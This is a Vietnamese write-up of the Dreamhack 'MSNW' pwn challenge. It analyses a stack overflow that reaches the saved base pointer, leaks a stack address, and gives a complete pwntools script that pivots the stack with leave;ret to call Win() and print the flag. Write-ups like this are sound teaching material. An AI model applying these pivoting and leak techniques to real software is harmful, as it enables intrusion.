---
title: "[DREAMHACK] - MSNW"
published: 2024-12-01
description: ""
image: "../image.png"
tags:
  - PWN
category: "Wargame"
draft: false
---

Trước khi vào exploit thì ta hãy xem qua source code có gì:

```cpp
/* msnw.c
 * gcc -no-pie -fno-stack-protector -mpreferred-stack-boundary=8 msnw.c -o msnw
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define MEONG 0
#define NYANG 1

#define NOT_QUIT 1
#define QUIT 0

void Init() {
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}

int Meong() {
    char buf[0x40];

    memset(buf, 0x00, 0x130);

    printf("meong 🐶: ");
    read(0, buf, 0x132);

    if (buf[0] == 'q')
        return QUIT;
    return NOT_QUIT;
}

int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}

int Call(int animal) {
    return animal == MEONG ? Meong() : Nyang();
}

void Echo() {
    while (Call(MEONG)) Call(NYANG);
}

void Win() {
    execl("/bin/cat", "/bin/cat", "./flag", NULL);
}

int main(void) {
    Init();

    Echo();
    puts("nyang 🐱: goodbye!");

    return 0;
}
```

Lướt sơ qua thì mình thấy chương trình này thực hiện 2 chức năng chính:

- Một là lấy input từ người dùng thông qua hàm `Meong()`
- Hai là in những gì ta nhập ra thông qua hàm `Nyang()`

Nhưng điều đáng chú ý ở đây là ở hàm `Meong()`:

```cpp
int Meong() {
    char buf[0x40];

    memset(buf, 0x00, 0x130);

    printf("meong 🐶: ");
    read(0, buf, 0x132);

    if (buf[0] == 'q')
        return QUIT;
    return NOT_QUIT;
}

```

Nó khởi tạo biến `buf` với `0x40` byte đồng thời set `NULL` cho `0x130` byte tính từ `buf`. Đáng chú ý hơn là hàm `read()` đọc 0x132 byte từ input của người dùng, điều này xảy ra lỗi `Buffer Overflow`. Bài này đặc biệt ở chỗ, nếu ta nhập `0x130` byte thì ta chỉ vừa chạm đến `saved rbp` và còn dư 2 bytes nữa (2 bytes này sẽ overflow 2 bytes cuối của saved rbp). Hãy cùng kiểm tra thử nào:

- Nhập input bình thường:

```nasm
pwndbg> x/50xg 0x7fffffffd7c0
0x7fffffffd7c0: 0x00000a6f6c6c6568      0x0000000000000000
0x7fffffffd7d0: 0x0000000000000000      0x0000000000000000
0x7fffffffd7e0: 0x0000000000000000      0x0000000000000000
0x7fffffffd7f0: 0x0000000000000000      0x0000000000000000
0x7fffffffd800: 0x0000000000000000      0x0000000000000000
0x7fffffffd810: 0x0000000000000000      0x0000000000000000
0x7fffffffd820: 0x0000000000000000      0x0000000000000000
0x7fffffffd830: 0x0000000000000000      0x0000000000000000
0x7fffffffd840: 0x0000000000000000      0x0000000000000000
0x7fffffffd850: 0x0000000000000000      0x0000000000000000
0x7fffffffd860: 0x0000000000000000      0x0000000000000000
0x7fffffffd870: 0x0000000000000000      0x0000000000000000
0x7fffffffd880: 0x0000000000000000      0x0000000000000000
0x7fffffffd890: 0x0000000000000000      0x0000000000000000
0x7fffffffd8a0: 0x0000000000000000      0x0000000000000000
0x7fffffffd8b0: 0x0000000000000000      0x0000000000000000
0x7fffffffd8c0: 0x0000000000000000      0x0000000000000000
0x7fffffffd8d0: 0x0000000000000000      0x0000000000000000
0x7fffffffd8e0: 0x0000000000000000      0x0000000000000000
0x7fffffffd8f0: 0x00007fffffffdaf0      0x0000000000401320
0x7fffffffd900: 0x0000000000000000      0x0000000000000000
0x7fffffffd910: 0x0000000000000000      0x0000000000000000
0x7fffffffd920: 0x0000000000000001      0x00007fffffffdd48
0x7fffffffd930: 0x000000000040139a      0x00007ffff7fd8dae
0x7fffffffd940: 0x0000000000000000      0x0000000000403e18

```

- Khi nhập vào payload `0x130` kí tự `A`:

```nasm
pwndbg> x/50xg 0x7fffffffd7c0
0x7fffffffd7c0: 0x4141414141414141      0x4141414141414141
0x7fffffffd7d0: 0x4141414141414141      0x4141414141414141
0x7fffffffd7e0: 0x4141414141414141      0x4141414141414141
0x7fffffffd7f0: 0x4141414141414141      0x4141414141414141
0x7fffffffd800: 0x4141414141414141      0x4141414141414141
0x7fffffffd810: 0x4141414141414141      0x4141414141414141
0x7fffffffd820: 0x4141414141414141      0x4141414141414141
0x7fffffffd830: 0x4141414141414141      0x4141414141414141
0x7fffffffd840: 0x4141414141414141      0x4141414141414141
0x7fffffffd850: 0x4141414141414141      0x4141414141414141
0x7fffffffd860: 0x4141414141414141      0x4141414141414141
0x7fffffffd870: 0x4141414141414141      0x4141414141414141
0x7fffffffd880: 0x4141414141414141      0x4141414141414141
0x7fffffffd890: 0x4141414141414141      0x4141414141414141
0x7fffffffd8a0: 0x4141414141414141      0x4141414141414141
0x7fffffffd8b0: 0x4141414141414141      0x4141414141414141
0x7fffffffd8c0: 0x4141414141414141      0x4141414141414141
0x7fffffffd8d0: 0x4141414141414141      0x4141414141414141
0x7fffffffd8e0: 0x4141414141414141      0x4141414141414141
0x7fffffffd8f0: 0x00007fffffffda0a      0x0000000000401320
0x7fffffffd900: 0x0000000000000000      0x0000000000000000
0x7fffffffd910: 0x0000000000000000      0x0000000000000000
0x7fffffffd920: 0x0000000000000001      0x00007fffffffdd48
0x7fffffffd930: 0x000000000040139a      0x00007ffff7fd8dae
0x7fffffffd940: 0x0000000000000000      0x0000000000403e18

```

Ta có thể thấy `saved rbp` của chúng ta hiện tại đang nằm ở `0x7fffffffd8f0`:

```nasm
pwndbg> i f
Stack level 0, frame at 0x7fffffffd900:
 rip = 0x401297 in Meong; saved rip = 0x401320
 called by frame at 0x7fffffffda1a
 Arglist at 0x7fffffffd8f0, args:
 Locals at 0x7fffffffd8f0, Previous frame's sp is 0x7fffffffd900
 Saved registers:
  rbp at 0x7fffffffd8f0, rip at 0x7fffffffd8f8
```

Do đó khi ta nhập `0x130` byte thì nó chỉ vừa chạm đếm mà thôi, không thể nhập thêm để overwrite `saved rip` để rồi cho nó thực thi hàm `Win()` cho chúng ta được. Lúc này ta có thể nghĩ đến `Stack Pivoting` bằng cách lợi dụng `leave; ret` ta overwrite `saved rbp` và rồi cho chương trình nhảy đến những nơi ta muốn. Nói thêm một chút về `leave; ret` thì `leave` là viết tắt của `move rsp, rbp; pop rbp` thì lệnh này có nhiệm vụ là chuyển giá trị hiện tại của `rbp` vào `rsp` đồng thời trả lại `saved rbp` của hàm gọi bằng `pop rbp`. Và `ret` sẽ return vào địa chỉ ở trên top stack.

Quay lại với bài này, ta biết được ta sẽ dùng `Stack Pivoting`, nhưng sau khi mình thử đi thử lại nhiều lần bằng cách overwrite 2 bytes cuối của `saved rbp` thông thường thôi thì mình thấy không khả thi lắm, vì lúc này mình nhận ra địa chỉ `Win()` không nằm trên stack và mình cũng không có cách nào để sử dụng `leave; ret` để nó nhảy vào đúng hàm mà mình mong muốn được. Nên mình đã nghĩ ra một cách là còn 1 thứ mà ta chưa khai thác đó là hàm `Nyang()`:

```cpp
int Nyang() {
    char buf[0x40];

    printf("nyang 🐱: ");
    printf("%s", buf);

    return NOT_QUIT;
}
```

- Trong IDA:

```cpp
__int64 Nyang()
{
  char v1[304]; // [rsp+C0h] [rbp-130h] BYREF

  printf(aNyang);
  printf("%s", v1);
  return 1LL;
}

```

Ta có thể thấy fmt `%s` sẽ không giới hạn những gì nó in ra từ biến `buf` cho đến khi nó gặp `NULL` byte. Và ta có thể tận dụng điều này để `leak` một địa chỉ nào đó ra. Ở lần thử trên ta đã thấy khi ta nhập `0x130` kí tự `A` thì ta có thể leak được một địa chỉ nào đó (ở đây là `0x00007fffffffda0a`), kiểm tra thêm thì mình thấy địa chỉ này là địa chỉ stack:

```nasm
pwndbg> vmmap 0x00007fffffffda0a
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
►   0x7ffffffdd000     0x7ffffffff000 rw-p    22000      0 [stack] +0x20a0a
```

Nên ý tưởng của mình ở đây sẽ là:

- Leak địa chỉ stack này ra
- Sử dụng địa chỉ leak đó tính ngược lại địa chỉ `stack` nơi mà lưu `input` của ta. Ở đây ta sẽ nhập 1 tràn địa chỉ của hàm `Win()`. Để khi nó return về thì ta không cần phải tính toán cộng/trừ bao nhiêu byte để nó return đúng về cái input địa chỉ hàm `Win()` mà ta đã nhập.
- Lợi dụng `leave; ret` overwrite 2 byte cuối của `saved rbp` thành `input_field` để thực thi hàm `Win()`

```python
#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./msnw', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*Meong+109
c
''') if not args.REMOTE else None

p = remote('host3.dreamhack.games',8269 ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================
Win = exe.sym['Win']

padding = b'A'*0x130

sa(b':',padding)
ru(padding)
leak = u64(p.recv(6)+b'\\0\\0')
input_field = leak - 0x330
slog("Leak",leak)
slog("Input field", input_field)

payload = p64(Win)*38 + p64(input_field)
slog("Payload len", len(payload))
sa(b':',payload)

interactive()

```

```bash
alter ^ Sol in ~/Dreamhack/MSNW/deploy
$ ./xpl.py
[+] Starting local process '/home/alter/Dreamhack/MSNW/deploy/msnw': pid 4075
[!] ASLR is disabled!
[+] Leak: 0x7fffffffdaf0
[+] Input field: 0x7fffffffd7c0
[+] Payload len: 0x138
[*] Switching to interactive mode
 [*] Process '/home/alter/Dreamhack/MSNW/deploy/msnw' stopped with exit code 0 (pid 4075)
DH{**flag**}

```
